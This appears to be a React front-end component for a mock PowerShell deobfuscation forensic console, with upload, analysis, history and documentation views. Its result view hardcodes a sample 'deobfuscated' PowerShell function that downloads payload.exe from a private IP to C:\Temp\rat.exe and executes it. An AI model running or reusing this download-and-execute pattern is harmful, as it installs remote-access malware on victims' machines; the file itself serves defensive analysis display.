import React, { useState } from 'react';
import { Head } from '@inertiajs/react';

export default function Home() {
    // === STATE MANAGEMENT ===
    const [viewState, setViewState] = useState('upload'); 
    const [file, setFile] = useState(null);
    const [fileName, setFileName] = useState("");
    const [jobId, setJobId] = useState(null);
    
    // Dummy Data
    const [historyList, setHistoryList] = useState([
        { id: "CASE-8821", name: "suspicious_payroll.ps1", date: "2 hours ago", status: "Malicious" },
        { id: "CASE-1290", name: "update_win.ps1", date: "5 hours ago", status: "Clean" },
    ]);

    // === HANDLER FUNCTIONS (DENGAN VALIDASI KETAT) ===
    const handleFileChange = (e) => {
        const selectedFile = e.target.files[0];
        
        if (selectedFile) {
            // Validasi Ekstensi File Manual
            const name = selectedFile.name.toLowerCase();
            const isValid = name.endsWith('.ps1') || name.endsWith('.txt');

            if (!isValid) {
                alert("❌ INVALID FILE FORMAT!\n\nSystem only accepts .ps1 (PowerShell) or .txt files.");
                // Reset input file biar kosong lagi
                e.target.value = null; 
                setFile(null);
                setFileName("");
                return;
            }

            // Kalau lolos validasi, baru set state
            setFile(selectedFile);
            setFileName(selectedFile.name);
        }
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        if (!file) return alert("Please select a file first.");

        // --- CONSOLE LOG SESUAI REQUEST TEMANMU ---
        console.log("==================================");
        console.log("SUBMIT DETECTED");
        console.log("File Name:", file.name);
        console.log("File Type:", file.type);
        console.log("File Size:", file.size);
        console.log("==================================");

        const mockJobId = "CASE-" + Math.floor(Math.random() * 10000);
        setJobId(mockJobId);
        setViewState('polling');

        setTimeout(() => {
            setViewState('result');
            setHistoryList(prev => [{ id: mockJobId, name: file.name, date: "Just now", status: "Analyzing" }, ...prev]);
        }, 3000);
    };

    const handleReset = () => {
        setFile(null);
        setFileName("");
        setViewState('upload');
    };

    // === COMPONENTS KECIL ===
    const NavItem = ({ active, label, icon, onClick }) => (
        <button 
            onClick={onClick}
            className={`group flex items-center gap-3 w-full px-4 py-3 text-sm font-medium transition-all duration-300 rounded-lg relative overflow-hidden ${active ? 'text-white' : 'text-zinc-500 hover:text-zinc-200'}`}
        >
            {active && <div className="absolute inset-0 bg-zinc-800/50 border-l-2 border-green-500"></div>}
            <span className={`relative z-10 ${active ? 'text-green-400' : 'group-hover:text-green-400 transition-colors'}`}>{icon}</span>
            <span className="relative z-10">{label}</span>
        </button>
    );

    return (
        <>
            <Head title="DeobStep Forensic" />
            
            <div className="flex h-screen bg-zinc-950 text-white font-sans selection:bg-green-500/30">
                
                {/* === SIDEBAR === */}
                <aside className="w-64 flex flex-col border-r border-zinc-900 bg-zinc-950/50 backdrop-blur-sm">
                    <div className="p-8 pb-10">
                        <div className="flex items-center gap-3">
                            <div className="w-8 h-8 bg-gradient-to-br from-green-500 to-emerald-700 rounded flex items-center justify-center text-white font-bold shadow-[0_0_15px_rgba(34,197,94,0.3)]">
                                <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 10l-2 1m0 0l-2-1m2 1v2.5M20 7l-2 1m2-1l-2-1m2 1v2.5M14 4l-2-1-2 1M4 7l2-1M4 7l2 1M4 7v2.5M12 21l-2-1m2 1l2-1m-2 1v-2.5M6 18l-2-1v-2.5M18 18l2-1v-2.5" /></svg>
                            </div>
                            <div>
                                <h1 className="text-xl font-bold tracking-tight text-white leading-none">DeobStep</h1>
                                <span className="text-xs text-zinc-500 font-mono">Forensic Console</span>
                            </div>
                        </div>
                    </div>

                    <nav className="px-4 space-y-2 flex-1">
                        <NavItem 
                            label="New Analysis" 
                            active={viewState === 'upload' || viewState === 'polling' || viewState === 'result'}
                            onClick={() => setViewState('upload')}
                            icon={<svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 13h6m-3-3v6m5 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" /></svg>}
                        />
                         <NavItem 
                            label="History" 
                            active={viewState === 'history'}
                            onClick={() => setViewState('history')}
                            icon={<svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>}
                        />
                         <NavItem 
                            label="Documentation" 
                            active={viewState === 'docs'}
                            onClick={() => setViewState('docs')}
                            icon={<svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" /></svg>}
                        />
                    </nav>
                </aside>

                {/* === MAIN CONTENT === */}
                <main className="flex-1 overflow-y-auto relative bg-zinc-950">
                    <div className="absolute top-0 left-0 w-full h-96 bg-gradient-to-b from-green-900/10 to-transparent pointer-events-none"></div>

                    <div className="h-full w-full p-10 md:p-14 relative z-10">

                        {/* VIEW: UPLOAD */}
                        {viewState === 'upload' && (
                            <div className="h-full flex flex-col items-center justify-center animate-in fade-in duration-500">
                                <div className="text-center mb-10">
                                    <h1 className="text-4xl md:text-5xl font-extrabold text-white tracking-tight mb-4">
                                        Start New <span className="text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-emerald-600">Investigation</span>
                                    </h1>
                                    <p className="text-zinc-400 max-w-lg mx-auto text-lg">
                                        Upload an obfuscated PowerShell script to generate a forensic report.
                                    </p>
                                </div>
                                
                                <div className="w-full max-w-xl">
                                    <label 
                                        className={`group relative flex flex-col items-center justify-center w-full h-72 rounded-2xl border-2 border-dashed cursor-pointer transition-all duration-300 ease-out 
                                        ${file 
                                            ? 'border-green-500/50 bg-green-900/10 shadow-[0_0_30px_rgba(34,197,94,0.15)]' 
                                            : 'border-zinc-800 bg-zinc-900/50 hover:border-zinc-600 hover:bg-zinc-900'
                                        }`}
                                    >
                                        <div className="flex flex-col items-center justify-center pt-5 pb-6 text-center z-10">
                                            <div className={`mb-6 p-4 rounded-full transition-all duration-500 ${file ? 'bg-green-500 text-black shadow-lg shadow-green-500/50 scale-110' : 'bg-zinc-800 text-zinc-400 group-hover:scale-110'}`}>
                                                <svg className="w-8 h-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" /></svg>
                                            </div>
                                            
                                            {file ? (
                                                <>
                                                    <p className="text-xl font-bold text-white mb-1">{fileName}</p>
                                                    <p className="text-sm text-green-400 font-mono">Ready to analyze</p>
                                                </>
                                            ) : (
                                                <>
                                                    <p className="text-lg font-medium text-zinc-300 mb-2">Drag & drop or click to upload</p>
                                                    <div className="flex gap-2 justify-center mt-2">
                                                        <span className="text-xs text-zinc-500 font-mono border border-zinc-800 px-2 py-1 rounded bg-zinc-950">.PS1</span>
                                                        <span className="text-xs text-zinc-500 font-mono border border-zinc-800 px-2 py-1 rounded bg-zinc-950">.TXT</span>
                                                    </div>
                                                </>
                                            )}
                                        </div>
                                        <input type="file" className="hidden" accept=".ps1,.txt" onChange={handleFileChange} />
                                    </label>

                                    <button 
                                        onClick={handleSubmit}
                                        disabled={!file}
                                        className={`mt-8 w-full py-4 rounded-xl font-bold text-lg tracking-wide transition-all duration-300 transform 
                                        ${file 
                                            ? 'bg-gradient-to-r from-green-600 to-emerald-600 hover:to-emerald-500 text-white shadow-lg shadow-green-900/50 hover:shadow-green-500/20 translate-y-0' 
                                            : 'bg-zinc-900 text-zinc-600 cursor-not-allowed border border-zinc-800'
                                        }`}
                                    >
                                        {file ? 'Begin Analysis' : 'Select a file to continue'}
                                    </button>
                                </div>
                            </div>
                        )}

                        {/* VIEW: POLLING */}
                        {viewState === 'polling' && (
                            <div className="flex flex-col items-center justify-center h-full text-center animate-in zoom-in duration-300">
                                <div className="relative w-24 h-24 mb-8">
                                    <div className="absolute inset-0 border-4 border-zinc-800 rounded-full"></div>
                                    <div className="absolute inset-0 border-4 border-green-500 rounded-full animate-spin border-t-transparent shadow-[0_0_20px_rgba(34,197,94,0.4)]"></div>
                                    <div className="absolute inset-0 flex items-center justify-center">
                                        <svg className="w-8 h-8 text-green-500 animate-pulse" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19.428 15.428a2 2 0 00-1.022-.547l-2.384-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z" /></svg>
                                    </div>
                                </div>
                                <h2 className="text-3xl font-bold text-white mb-2">Analyzing Artifacts</h2>
                                <p className="text-zinc-500 font-mono bg-zinc-900 px-3 py-1 rounded border border-zinc-800">Case ID: <span className="text-green-400">{jobId}</span></p>
                                <p className="text-xs text-zinc-600 mt-8 animate-pulse">Running Forensic Engine...</p>
                            </div>
                        )}

                        {/* VIEW: RESULT */}
                        {viewState === 'result' && (
                            <div className="max-w-5xl mx-auto animate-in slide-in-from-bottom-4 duration-500">
                                <div className="flex items-center justify-between mb-8">
                                    <div>
                                        <div className="flex items-center gap-2 mb-2">
                                            <span className="flex h-3 w-3 relative">
                                                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                                                <span className="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
                                            </span>
                                            <span className="text-green-500 font-bold text-xs tracking-widest uppercase">Investigation Complete</span>
                                        </div>
                                        <h1 className="text-3xl font-bold text-white">{fileName}</h1>
                                        <p className="text-sm text-zinc-500 mt-1 font-mono">Case ID: {jobId}</p>
                                    </div>
                                    <div className="flex gap-3">
                                        <button onClick={handleReset} className="px-5 py-2.5 border border-zinc-700 hover:border-white text-zinc-300 hover:text-white rounded-lg text-sm font-medium transition">
                                            Close Case
                                        </button>
                                        <button className="px-5 py-2.5 bg-green-600 hover:bg-green-500 text-white rounded-lg text-sm font-bold transition shadow-lg shadow-green-900/40">
                                            Download Report
                                        </button>
                                    </div>
                                </div>

                                <div className="bg-[#1e1e1e] rounded-xl border border-zinc-800 overflow-hidden shadow-2xl">
                                    <div className="bg-[#252526] px-4 py-3 flex justify-between items-center border-b border-[#333]">
                                        <div className="flex gap-2">
                                            <div className="w-3 h-3 rounded-full bg-red-500/50"></div>
                                            <div className="w-3 h-3 rounded-full bg-yellow-500/50"></div>
                                            <div className="w-3 h-3 rounded-full bg-green-500/50"></div>
                                        </div>
                                        <span className="text-xs text-zinc-500 font-mono">deobfuscated_output.ps1</span>
                                        <div className="w-10"></div>
                                    </div>
                                    
                                    <div className="relative group">
                                        <button className="absolute top-4 right-4 text-xs bg-zinc-800 hover:bg-zinc-700 text-zinc-300 px-3 py-1.5 rounded opacity-0 group-hover:opacity-100 transition">Copy</button>
                                        <pre className="p-6 overflow-x-auto text-sm font-mono leading-relaxed text-zinc-300">
{`<span className="text-blue-400">function</span> <span className="text-yellow-300">Malicious-Connect</span> {
    <span className="text-zinc-500"># Connection Object created</span>
    <span className="text-blue-300">$c2_server</span> = <span className="text-orange-300">"http://192.168.1.55/payload.exe"</span>;
    
    <span className="text-blue-400">try</span> {
        <span className="text-purple-400">Invoke-WebRequest</span> -Uri <span className="text-blue-300">$c2_server</span> -OutFile <span className="text-orange-300">"C:\\Temp\\rat.exe"</span>
        <span className="text-purple-400">Start-Process</span> -FilePath <span className="text-orange-300">"C:\\Temp\\rat.exe"</span>
    } <span className="text-blue-400">catch</span> {
        <span className="text-purple-400">Write-Host</span> <span className="text-orange-300">"Failed to connect to C2"</span>
    }
}`}
                                        </pre>
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* VIEW: HISTORY */}
                        {viewState === 'history' && (
                            <div className="max-w-5xl mx-auto animate-in fade-in duration-500">
                                <h2 className="text-2xl font-bold mb-6 text-white">Case History</h2>
                                <div className="border border-zinc-800 rounded-xl overflow-hidden bg-zinc-900/30">
                                    <table className="w-full text-left">
                                        <thead className="bg-zinc-900 text-xs uppercase text-zinc-500 font-medium">
                                            <tr>
                                                <th className="px-6 py-4">Case ID</th>
                                                <th className="px-6 py-4">Filename</th>
                                                <th className="px-6 py-4">Timestamp</th>
                                                <th className="px-6 py-4 text-right">Verdict</th>
                                            </tr>
                                        </thead>
                                        <tbody className="divide-y divide-zinc-800">
                                            {historyList.map((item, index) => (
                                                <tr key={index} className="hover:bg-zinc-800/50 transition cursor-pointer group">
                                                    <td className="px-6 py-4 font-mono text-zinc-400 group-hover:text-green-400 transition-colors">{item.id}</td>
                                                    <td className="px-6 py-4 font-medium text-zinc-200">{item.name}</td>
                                                    <td className="px-6 py-4 text-zinc-500 text-sm">{item.date}</td>
                                                    <td className="px-6 py-4 text-right">
                                                        <span className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${
                                                            item.status === 'Malicious' ? 'bg-red-500/10 text-red-400 border border-red-500/20' : 
                                                            item.status === 'Clean' ? 'bg-green-500/10 text-green-400 border border-green-500/20' : 
                                                            'bg-yellow-500/10 text-yellow-400 border border-yellow-500/20'
                                                        }`}>
                                                            {item.status}
                                                        </span>
                                                    </td>
                                                </tr>
                                            ))}
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        )}

                        {/* VIEW: DOCS */}
                        {viewState === 'docs' && (
                            <div className="max-w-3xl mx-auto prose prose-invert prose-headings:text-white prose-a:text-green-400">
                                <h1 className="text-3xl font-bold mb-6">Documentation</h1>
                                <p className="text-lg text-zinc-400 mb-8">
                                    DeobStep helps security researchers analyze obfuscated scripts safely.
                                </p>
                                
                                <div className="p-6 bg-zinc-900/50 border border-zinc-800 rounded-xl mb-8">
                                    <h3 className="text-lg font-bold text-white mb-2">Getting Started</h3>
                                    <ol className="list-decimal list-inside space-y-2 text-zinc-400">
                                        <li>Prepare your <code className="text-green-400 bg-zinc-950 px-1 py-0.5 rounded">.ps1</code> file.</li>
                                        <li>Upload using the dashboard.</li>
                                        <li>Wait for the engine to sanitize and analyze the code.</li>
                                        <li>Download the report in MD or PDF format.</li>
                                    </ol>
                                </div>
                            </div>
                        )}

                    </div>
                </main>
            </div>
        </>
    );
}